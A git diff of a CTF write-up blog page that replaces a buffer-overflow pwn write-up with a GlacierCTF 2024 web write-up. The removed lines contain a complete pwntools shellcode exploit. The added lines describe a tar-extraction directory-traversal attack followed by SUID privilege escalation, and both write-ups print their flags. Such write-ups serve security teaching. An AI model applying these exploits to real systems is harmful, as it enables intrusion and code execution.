@@ -3,42 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769773824900">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.786029315102">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Easyregister</title>
-    <meta name="title" content="Easyregister">
-    <meta name="description" content="First let's download and analyze the binary">
+    <title>Fuzzybytes</title>
+    <meta name="title" content="Fuzzybytes">
+    <meta name="description" content="Application is vulnerable to zipslip(tarslip) vulnerability to get the command injection and SUID privilege to get the flag.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/jopraveen/">
+    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/glacierctf-2024/fuzzybytes/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/jopraveen/">
-    <meta property="og:title" content="Easyregister">
-    <meta property="og:description" content="First let's download and analyze the binary">
-    <meta property="og:image" content="https://i.imgur.com/urPqzh3.png">
+    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/glacierctf-2024/fuzzybytes/">
+    <meta property="og:title" content="Fuzzybytes">
+    <meta property="og:description" content="Application is vulnerable to zipslip(tarslip) vulnerability to get the command injection and SUID privilege to get the flag.">
+    <meta property="og:image" content="https://sibivasan.gitbook.io/~gitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FJTs1HYEabxgAjK24ADUP%252Fimage.png%3Falt%3Dmedia%26token%3D09aa1f27-dbf3-4441-b011-3c29d8427342&width=768&dpr=4&quality=100&sign=ca1f8862&sv=1">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/jopraveen/">
-    <meta property="twitter:title" content="Easyregister">
-    <meta property="twitter:description" content="First let's download and analyze the binary">
-    <meta property="twitter:image" content="https://i.imgur.com/urPqzh3.png">
+    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/glacierctf-2024/fuzzybytes/">
+    <meta property="twitter:title" content="Fuzzybytes">
+    <meta property="twitter:description" content="Application is vulnerable to zipslip(tarslip) vulnerability to get the command injection and SUID privilege to get the flag.">
+    <meta property="twitter:image" content="https://sibivasan.gitbook.io/~gitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FJTs1HYEabxgAjK24ADUP%252Fimage.png%3Falt%3Dmedia%26token%3D09aa1f27-dbf3-4441-b011-3c29d8427342&width=768&dpr=4&quality=100&sign=ca1f8862&sv=1">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="../../../assets/img/logo.png" rel="icon">
-    <link href="../../../resources/css/retype.css?v=3.5.0.769773824900" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.6.0.786029315102" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.769773824900" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.769773824900" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.5.0.769773824900" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.6.0.786029315102" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.6.0.786029315102" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -205,10 +204,10 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="easyregister" class="break-words">
+<doc-anchor-target id="glacier-ctf-2024" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#easyregister">#</doc-anchor-trigger>
-        <span>Easyregister</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#glacier-ctf-2024">#</doc-anchor-trigger>
+        <span>Glacier CTF-2024</span>
     </h1>
 </doc-anchor-target>
 <div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
@@ -218,156 +217,160 @@
           <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
             <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" fill="white"><g><rect width="2rem" height="1.7rem" fill="#c5c5c5"/><circle r="0.44rem" cy="0.83rem" cx="1rem"/><ellipse ry="0.96rem" rx="0.77rem" cy="2.15rem" cx="1rem"/></g></svg>
           </div>
-          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">jopraveen</div>
+          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">Sibivasan</div>
         </div>
     </div>
     <div class="mx-2">&#9679;</div>
     <div>In&nbsp;</div>
-    <div><a href="../../../categories/1337up/">1337UP</a></div>
+    <div><a href="../../../categories/glacierctf/">GlacierCTF</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2022-03-13</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-11-24</span></div>
 </div>
 
-<doc-anchor-target id="easy-register">
+<p>Application is vulnerable to zipslip(tarslip) vulnerability to get the command injection and SUID privilege to get the flag.</p>
+<doc-anchor-target id="fuzzybytes">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#easy-register">#</doc-anchor-trigger>
-        <span>Easy Register</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#fuzzybytes">#</doc-anchor-trigger>
+        <span>Fuzzybytes:</span>
     </h2>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="https://i.imgur.com/urPqzh3.png" alt="">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FJTs1HYEabxgAjK24ADUP%252Fimage.png%3Falt%3Dmedia%26token%3D09aa1f27-dbf3-4441-b011-3c29d8427342&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=ca1f8862&amp;sv=1" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<ul>
-<li>First let&#x27;s download and analyze the binary</li>
-</ul>
-<doc-anchor-target id="info">
-    <h4>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#info">#</doc-anchor-trigger>
-        <span>Info</span>
-    </h4>
-</doc-anchor-target>
-<ul>
-<li>ELF 64-bit executable</li>
-<li>Dynamically linked</li>
-<li>Not stripped</li>
-</ul>
-<p><strong>checksec:</strong></p>
-<p><figure class="content-center">
-    <img src="https://i.imgur.com/FLpgy9B.png" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<ul>
-<li>The Stack is executable because NX is disabled</li>
-<li>First let&#x27;s run the binary and see what it gives</li>
-</ul>
-<doc-anchor-target id="analyzing">
-    <h4>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#analyzing">#</doc-anchor-trigger>
-        <span>Analyzing</span>
-    </h4>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock line-numbers>
-<pre class="language-javascript"><code v-pre class="language-javascript">➜  pwn  ./easy_register 
-  _ _______________ _   _ ____  
- / |___ /___ /___  | | | |  _ \ 
- | | |_ \ |_ \  / /| | | | |_) |
- | |___) |__) |/ / | |_| |  __/ 
- |_|____/____//_/   \___/|_|    
-                                
-[i] Initialized attendee listing at 0x7ffd0421cac0.
-[i] Starting registration application.
-
-Hacker name &gt; jopraveen
-
-[+] Registration completed. Enjoy!
-[+] Exiting.</code></pre>
-</doc-codeblock></div>
-<ul>
-<li>We have a leak <code v-pre>0x7ffd0421cac0</code></li>
-<li>Most likely, this will be the starting address of our buffer</li>
-<li>Then we&#x27;re prompted to give our name</li>
-<li>May be there&#x27;s a buffer overflow?</li>
-<li>Let&#x27;s decompile this binary and see what it does :D</li>
-</ul>
-<p><figure class="content-center">
-    <img src="https://i.imgur.com/AR1b2AI.png" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<ul>
-<li>Cool, they&#x27;re using gets and it&#x27;s vulnerable to buffer overflow</li>
-<li>Find the offset to Instruction pointer (I didn&#x27;t mention it in the post because it&#x27;s very easy)</li>
-<li>Now let&#x27;s write our exploit</li>
-</ul>
-<div class="codeblock-wrapper"><doc-codeblock line-numbers>
-<pre class="language-python"><code v-pre class="language-python">from pwn import *
-
-elf = context.binary = ELF('easy_register')
-p = elf.process()
-p = remote('easyregister.ctf.intigriti.io',7777)
-
-p.recvuntil('listing at ')
-stack_buffer = int(p.recvline().replace(b'.',b''),16)
-log.success(f'stack leak: {hex(stack_buffer)}')</code></pre>
-</doc-codeblock></div>
-<ul>
-<li>First let&#x27;s store the leak in a variable</li>
-</ul>
-<div class="codeblock-wrapper"><doc-codeblock line-numbers>
-<pre class="language-python"><code v-pre class="language-python">payload = asm(shellcraft.sh()) # shellcode
-payload += b'A'*(88 - len(payload)) # junk
-payload += p64(stack_buffer) # buffer base address</code></pre>
-</doc-codeblock></div>
-<ul>
-<li>Let&#x27;s put our shellcode at the beginning and fill some junk until RIP</li>
-</ul>
-<p><em>Note: Offset to RIP is <strong>88</strong></em></p>
-<ul>
-<li>Finally let&#x27;s overwrite the Instruction pointer with the leaked value (our input buffer&#x27;s starting address)</li>
-</ul>
-<doc-anchor-target id="full-exploit">
+<doc-anchor-target id="static-analysys">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#full-exploit">#</doc-anchor-trigger>
-        <span>Full exploit</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#static-analysys">#</doc-anchor-trigger>
+        <span>Static analysys:</span>
     </h3>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock line-numbers>
-<pre class="language-python"><code v-pre class="language-python">from pwn import *
-
-elf = context.binary = ELF('easy_register')
-p = elf.process()
-p = remote('easyregister.ctf.intigriti.io',7777)
-
-p.recvuntil('listing at ')
-stack_buffer = int(p.recvline().replace(b'.',b''),16)
-log.success(f'stack leak: {hex(stack_buffer)}')
-
-payload = asm(shellcraft.sh())
-payload += b'A'*(88 - len(payload))
-payload += p64(stack_buffer)
-
-p.sendline(payload)
-p.interactive()</code></pre>
-</doc-codeblock></div>
+<p>In <code v-pre>Upload.php</code> executing the <code v-pre>/check_for_malicious_code.py</code>file to check the uploaded file.</p>
 <p><figure class="content-center">
-    <img src="https://i.imgur.com/XzfYQ6L.png" alt="">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FCD9k5IqtS7iam6MfvyWB%252Fimage.png%3Falt%3Dmedia%26token%3D3ed44951-e386-4241-ab1c-b6d18e155b8c&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=1f5736d7&amp;sv=1" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<ul>
-<li>We got our flag <code v-pre>1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}</code></li>
-</ul>
+<p>In <code v-pre>check_for_malicious_code.py:</code> application extracts the files from the <code v-pre>tar</code> and checking for any malicious content and after checking it will remove the file from the directory.</p>
+<p>For Extracting the .tar application uses the <code v-pre>tar.extractall</code> and for removing <code v-pre>shutil.rmtree</code> once the file uploded and scanned it will deleted by the application.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252F484PtlIvbZrQwCcQ94JA%252Fimage.png%3Falt%3Dmedia%26token%3D3cd88b45-6f66-421c-9e9f-5829173776df&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=2eabeaa7&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p><code v-pre>tar.extractall</code> fuction is vulnerable to <code v-pre>directory traversal attack</code>.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252Fmvui7BSkcpDDzgzDjK2T%252Fimage.png%3Falt%3Dmedia%26token%3Daf50ca74-a629-4713-b889-154e4c4df2d9&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=edd7eb5&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>POC:</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FBKczhQF72EM3kkquASJf%252Fimage.png%3Falt%3Dmedia%26token%3D105f029d-1a2e-41df-99a1-352ca6535e28&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=501ce8b2&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="dynamic-analysys">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dynamic-analysys">#</doc-anchor-trigger>
+        <span>Dynamic analysys:</span>
+    </h3>
+</doc-anchor-target>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FywhgY5RuTc0ZFZreAzbX%252Fimage.png%3Falt%3Dmedia%26token%3D554d36ef-f367-49f2-8660-d749dcfc1675&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=e8562a7&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Create the tar file:</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FnuyxiAII4MmyoSKr8E0z%252Fimage.png%3Falt%3Dmedia%26token%3D315f40da-1482-42fd-8186-a143655aa927&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=51f35834&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Try our payload in local environment:</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FqLKip8kBm8EKvduQE5GS%252Fimage.png%3Falt%3Dmedia%26token%3D9cb64117-c1f8-4a23-9455-5d0fe4e079eb&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=34bf62c7&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We have uploaded the file:</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FfejFqwqaYgUN7gyXe5XP%252Fimage.png%3Falt%3Dmedia%26token%3De05222e2-79ff-47fa-b53a-16699ed71fc7&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=a60ff3d1&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We have successfully traverse and put it in <code v-pre>/var/www/html</code> repository.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252Fc1cGznhxBXTbqRQsllWX%252Fimage.png%3Falt%3Dmedia%26token%3D897b144e-4cde-4f22-81d2-f51f584764c6&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=f04337ee&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Successfully got a command execution:</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FeG9vVOPA2sdJDc6HGmX4%252Fimage.png%3Falt%3Dmedia%26token%3Df1722350-5997-452e-94a3-6f50625b42e7&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=303b92d0&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>But not able to read the flag.txt.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252F6snLhJ4zZgWmQBgnY4zv%252Fimage.png%3Falt%3Dmedia%26token%3Dff773361-6105-4685-a74e-4695298a55b6&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=334d9a92&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We don&#x27;t have permission to read the /root/flag.txt</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FL1A8Gyp9ujii3pLk3Tq9%252Fimage.png%3Falt%3Dmedia%26token%3D8bef60ee-b8a2-4068-b2eb-520deb0d42d4&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=3e274590&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>While checking for the SUID binaries we got tar .</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FWwL9YcXDXr5KwBDHtVsT%252Fimage.png%3Falt%3Dmedia%26token%3D2b2ed2a3-e0c1-4a12-8f92-ef08e72ebe4b&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=1383222f&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>So decided to zip the flag using the tar.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FpBE8HWPszk2WOJ1aOfSI%252Fimage.png%3Falt%3Dmedia%26token%3D5cab90d3-9b99-43c7-b813-66e4ca373acb&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=d14b537e&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Uploaded the new payload and execute.</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FzJiv0aBak8z6NSuOlmtl%252Fimage.png%3Falt%3Dmedia%26token%3Dc7d212df-1dc1-4c4d-82b5-a1da45ad6e8e&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=87a9e7c9&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>While checking the local directory we get the flag.tar</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FmYRTgqujD7VMyChLUQ4w%252Fimage.png%3Falt%3Dmedia%26token%3D7486b8df-99a1-4f42-ab37-88135d456a34&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=cf0eb328&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252FhnpGch6RS8hqf9R5MBIc%252Fimage.png%3Falt%3Dmedia%26token%3D8e80760c-b7d9-4e46-8029-ffa1a5529f44&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=af60211a&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Got the flag in local.</p>
+<p>and got the flag in the CTF</p>
+<p><figure class="content-center">
+    <img src="https://sibivasan.gitbook.io/%7Egitbook/image?url=https%3A%2F%2F1152868336-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FCgUNmwmwzhhEXlNJ5H3g%252Fuploads%252F1ZHKUfWjhgOhZcXpFHMp%252Fimage.png%3Falt%3Dmedia%26token%3Dcb89b769-00fa-4170-bb85-a45dd297c528&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=37a8bc8e&amp;sv=1" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Flag: <code v-pre>gctf{c0nGr4tZ_on_Z1p_sLiDinG_4nD_Tar_diving}</code></p>
 
                                 <div class="flex items-center mt-6 mb-6 clear-both">
                                     <span>
                                         <a href="../../../tags/">
                                             <svg class="inline-block -mb-px mr-1.5 text-blue-500 dark:text-blue-400" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" overflow="visible" fill="currentColor"><g><path d="M21.3 9.88l-8.59-8.59C12.52 1.11 12.27 1 12 1H2c-.55 0-1 .45-1 1v10c0 .27.11.52.29.71l8.59 8.58c.57.57 1.32.88 2.12.88s1.55-.31 2.12-.88l7.17-7.17a3.009 3.009 0 00.01-4.24zm-1.42 2.82l-7.17 7.17c-.39.39-1.02.39-1.42 0L3 11.59V3h8.59l8.29 8.29c.39.39.39 1.03 0 1.41z" /><path d="M7.01 6C6.45 6 6 6.45 6 7s.45 1 1 1 1-.45 1-1-.44-1-.99-1z" /></g></svg>
                                         </a>
-                                        <span class="mr-2"><a href="../../../tags/pwn/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
-                                    <span>pwn</span>
+                                        <span class="mr-2"><a href="../../../tags/web/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
+                                    <span>web</span>
+                                </a></span>
+                                        <span class="mr-2"><a href="../../../tags/zipslip/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
+                                    <span>zipslip</span>
                                 </a></span>
                                     </span>
                                 </div>
@@ -379,20 +382,20 @@ p.interactive()</code></pre>
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up---intigrity/vyshak/">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/glacierctf-2024/findme/">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                                                <span class="block mt-1">Blink’s Secret</span>
+                                                <span class="block mt-1">Find​Me</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up---intigrity/admin/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/hsctf23/web/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Getting admin access</span>
+                                                <span class="block mt-1">HSCTF 2023 Web writeup</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -436,6 +439,6 @@ p.interactive()</code></pre>
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Easyregister", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Fuzzybytes", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
